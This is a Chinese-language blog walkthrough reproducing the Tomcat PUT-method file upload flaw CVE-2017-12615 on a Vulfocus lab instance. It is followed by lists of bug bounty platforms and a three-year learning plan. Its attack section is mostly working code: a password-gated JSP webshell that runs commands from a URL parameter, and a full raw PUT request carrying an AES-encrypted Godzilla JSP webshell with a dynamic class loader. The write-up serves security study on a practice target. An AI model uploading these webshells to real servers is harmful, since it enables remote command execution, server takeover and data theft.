# 原创
：  【漏洞复现-Tomacat-文件上传】vulfocus/tomcat-cve_2017_12615

# 【漏洞复现-Tomacat-文件上传】vulfocus/tomcat-cve_2017_12615

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）JSP后门文件（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|文件上传漏洞复现|目标|状态
|[【漏洞复现-dedecms-文件上传】vulfocus/dedecms-cve_2019_8933](https://blog.csdn.net/qq_53079406/article/details/127348900)|后台的新建、上传文件功能、修改后缀功能|已发布
|[【漏洞复现-tomcat-弱口令+文件上传】vulfocus/tomcat-pass-getshell](https://blog.csdn.net/qq_53079406/article/details/127272129)|后台部署WAR报getshell|已发布
|[【漏洞复现-weblogic-文件上传】vulfocus/weblogic-cve_2018_2894](https://blog.csdn.net/qq_53079406/article/details/127257176)|后台新建、上传文件的功能点|已发布
|[【漏洞复现-showdoc-文件上传】​vulfocus/showdoc-cnvd_2020_26585](https://blog.csdn.net/qq_53079406/article/details/127251592)|构造上传文件的数据包|已发布
|[【漏洞复现-monstra-文件上传】vulfocus/monstra_cve_2020_13384](https://blog.csdn.net/qq_53079406/article/details/127241657)|PHP的特殊后缀绕过|已发布
|[【漏洞复现-oklite-文件上传】vulfocus/oklite-cve_2019_16131](https://blog.csdn.net/qq_53079406/article/details/127240000)|后台上传zip数据包，服务器自动解析|已发布
|[【漏洞复现-dcrCms-文件上传】vulfocus/dcrcms-cnvd_2020_27175](https://blog.csdn.net/qq_53079406/article/details/127238674)|后台上传点，修改上传文件的类型|已发布
|[【漏洞复现-TypesetterCms-文件上传ZIP】vulfocus/typesetter-cve_2020_25790](https://blog.csdn.net/qq_53079406/article/details/127235610)|后台自带解析功能|已发布
|[【漏洞复现-phpok-文件上传】vulfocus/phpok-cve_2018_12491](https://blog.csdn.net/qq_53079406/article/details/127229175)|后台新建、上传|已发布
|[【漏洞复现-EmpireCms-文件上传】vulfocus/empirecms-cve_2018_18086](https://blog.csdn.net/qq_53079406/article/details/127227989)|新建上传、特定后缀文件|已发布
|[【漏洞复现-Apache-文件上传】vulfocus/apache-cve_2017_15715](https://blog.csdn.net/qq_53079406/article/details/127196849)|后缀检测截断|已发布
|[【漏洞复现-jquery-文件上传】vulfocus/jquery-cve_2018_9207](https://blog.csdn.net/qq_53079406/article/details/127195214)|curl命令上传工具|已发布
|[【漏洞复现-Tomacat-文件上传】vulfocus/tomcat-cve_2017_12615](https://blog.csdn.net/qq_53079406/article/details/127197695)|JSP后门文件|已发布
|2023将更新更多，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[1.4、条件：](#1.4%E3%80%81%E6%9D%A1%E4%BB%B6%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:63174











> 
<h3>1.2、知识:</h3>
1、修改请求方法，通过数据包传送数据
2、学会使用OPTIONS提交
3、使用哥斯拉后面工具（超级强）
……


> 
<h3>1.3、描述：</h3>
Tomcat 是一个小型的轻量级应用服务器，是开发和调试JSP 程序的首选。
攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。


> 
<h3>1.4、条件：</h3>
1、版本：Apache Tomcat 7.0.0 – 7.0.81
2、开启PUT方法<br/> 默认情况下readonly是true，此时PUT和DELETE方法是被拒绝的，当readonly为false时，便会开启。打开tomcat/conf/web.xml文件，找到default servlet的配置项，添加readonly那一项


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
抓包

 使用OPTIONS提交<img alt="" height="395" src="https://img-blog.csdnimg.cn/7cf81094b81b46418ff02b462b8cfb14.png" width="1052"/>

验证漏洞是否存在的话<br/> 修改请求方式为 PUT /test.jsp/ HTTP/1.1<br/> 添加请求体为 &lt;%out.print("hacker"); %&gt;<br/>  

 访问test.jsp即可<img alt="" height="223" src="https://img-blog.csdnimg.cn/0561a258531b4e3397b28d74b6802409.png" width="863"/>
<hr/>
上传执行命令脚本<br/> 请求方式 ：
<pre>`PUT /test.jsp/ HTTP/1.1`</pre>
请求体：
（借鉴的大佬的，我的方法太普通了，就是大家都会的，没营养）
<pre><code>&lt;%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("&lt;pre&gt;");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("&lt;/pre&gt;");
    } 
%&gt;</code></pre>


访问上传点<br/> http://ip:端口/test.jsp?&amp;pwd=123&amp;cmd=pwd

<hr/>
上传马
连接webshell
jsp木马为（用哥斯拉生成的）
[【后门工具】哥斯拉，YYDS#<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.0/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M85B"/>https://blog.csdn.net/qq_53079406/article/details/127224240?spm=1001.2014.3001.5502](https://blog.csdn.net/qq_53079406/article/details/127224240?spm=1001.2014.3001.5502)
再用同样方法修改为PUT上传jsp马
<pre><code>PUT /test.jsp/ HTTP/1.1
Host: 123.58.224.8:63174
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=68C661A6F14835A604475B436F524A77
Upgrade-Insecure-Requests: 1
Content-Length: 417

&lt;%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%&gt;</code></pre>






---


> 
<h3>2.4、解题：</h3>
找到/tmp
可以通过命令行

 还是通过文件管理把






---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

